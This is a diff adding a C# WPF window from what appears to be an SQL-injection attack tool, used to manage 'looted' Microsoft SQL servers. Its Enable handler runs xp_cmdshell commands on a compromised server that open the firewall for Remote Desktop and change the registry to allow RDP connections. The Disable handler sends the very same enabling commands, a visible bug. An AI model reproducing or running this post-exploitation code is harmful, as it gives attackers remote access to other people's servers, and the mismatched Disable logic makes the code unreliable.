@@ -1,0 +1,157 @@
+﻿using System;
+using System.Windows;
+using System.Windows.Controls;
+using System.Windows.Threading;
+using WarSQLiv2.Exploitation.Control;
+using WarSQLiv2.Exploitation.PostExploitation;
+
+namespace WarSQLiv2.UserControls.Attack.MSSQL
+{
+    /// <summary>
+    /// Interaction logic for FrmRdpManager.xaml
+    /// </summary>
+    public partial class FrmRdpManager : Window
+    {
+        private readonly LanguageControl _languageControl = new LanguageControl();
+        public xpCmdShellControl cmdControl = new xpCmdShellControl();
+        readonly MsSqlPostExploitation _postExploitation = new MsSqlPostExploitation();
+        private int _selectedId = 0;
+        public FrmRdpManager()
+        {
+            InitializeComponent();
+        }
+        private void Window_Loaded(object sender, RoutedEventArgs e)
+        {
+            _languageControl.FindLang();
+            var lootedFileControl = new LootedFileControl();
+            try
+            {
+                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                {
+                    btnDisable.Content = _languageControl.SelectedLanguage.GetString("ButtonDisable");
+                    btnEnable.Content = _languageControl.SelectedLanguage.GetString("ButtonEnable");
+                    Title = _languageControl.SelectedLanguage.GetString("TitleRDP");
+                    lootedFileControl.FileControl();
+                    var lootedList = lootedFileControl.LootedList;
+                    foreach (var t in lootedList)
+                    {
+                        lstLooted.Items.Add(t);
+                    }
+
+                    lstLooted.SelectedIndex = 0;
+                    var toolStripControl = new ToolStripInformation
+                    {
+                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
+                        Command = "sp_server_info",
+                    };
+                    toolStripControl.SqlServerInformation();
+                    lblStrip.Content = string.Empty;
+                    lblStrip.Content = toolStripControl.SqlServerInfo;
+                });
+
+            }
+            catch (Exception exp)
+            {
+                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                {
+                    txtStatus.AppendText(lootedFileControl.Exception);
+                });
+            }
+        }
+        private void lstLooted_SelectionChanged(object sender, SelectionChangedEventArgs e)
+        {
+            try
+            {
+                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                {
+                    _selectedId = 0;
+                    _selectedId = lstLooted.SelectedIndex;
+                    lblStrip.Content = string.Empty;
+                    var toolStripControl = new ToolStripInformation
+                    {
+                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
+                        Command = "sp_server_info",
+                    };
+                    toolStripControl.SqlServerInformation();
+                    lblStrip.Content = toolStripControl.SqlServerInfo;
+                });
+
+            }
+            catch (Exception exp)
+            {
+                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                {
+                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
+                });
+            }
+        }
+        private void btnEnable_Click(object sender, RoutedEventArgs e)
+        {
+            if (lstLooted.SelectedIndex != -1)
+            {
+                try
+                {
+                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                    {
+                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
+                        var rdpCommand = string.Empty;
+                        rdpCommand += "USE [master]\r\n";
+                        rdpCommand += "EXEC xp_cmdshell 'netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes';\r\n";
+                        rdpCommand += "EXEC xp_cmdshell 'reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f';";
+                        _postExploitation.ExploitCode = rdpCommand;
+                        _postExploitation.RunExploit();
+                        txtStatus.AppendText(Environment.NewLine + _postExploitation.ExploitResult.Replace("\r", "").Replace("\n", ""));
+                    });
+                }
+                catch (Exception exp)
+                {
+                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                    {
+                        txtStatus.AppendText(string.Format(_languageControl.SelectedLanguage.GetString("Exception1"), Environment.NewLine, exp.Message));
+                    });
+                }
+            }
+            else
+            {
+                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                {
+                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageExploitError1")}");
+                });
+            }
+        }
+        private void btnDisable_Click(object sender, RoutedEventArgs e)
+        {
+            if (lstLooted.SelectedIndex != -1)
+            {
+                try
+                {
+                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                    {
+                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
+                        var rdpCommand = string.Empty;
+                        rdpCommand += "USE [master]\r\n";
+                        rdpCommand += "EXEC xp_cmdshell 'netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes';\r\n";
+                        rdpCommand += "EXEC xp_cmdshell 'reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f';";
+                        _postExploitation.ExploitCode = rdpCommand;
+                        _postExploitation.RunExploit();
+                        txtStatus.AppendText(Environment.NewLine + _postExploitation.ExploitResult.Replace("\r", "").Replace("\n", ""));
+                    });
+                }
+                catch (Exception exp)
+                {
+                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                    {
+                        txtStatus.AppendText(string.Format(_languageControl.SelectedLanguage.GetString("Exception1"), Environment.NewLine, exp.Message));
+                    });
+                }
+            }
+            else
+            {
+                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                {
+                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageExploitError1")}");
+                });
+            }
+        }
+    }
+}
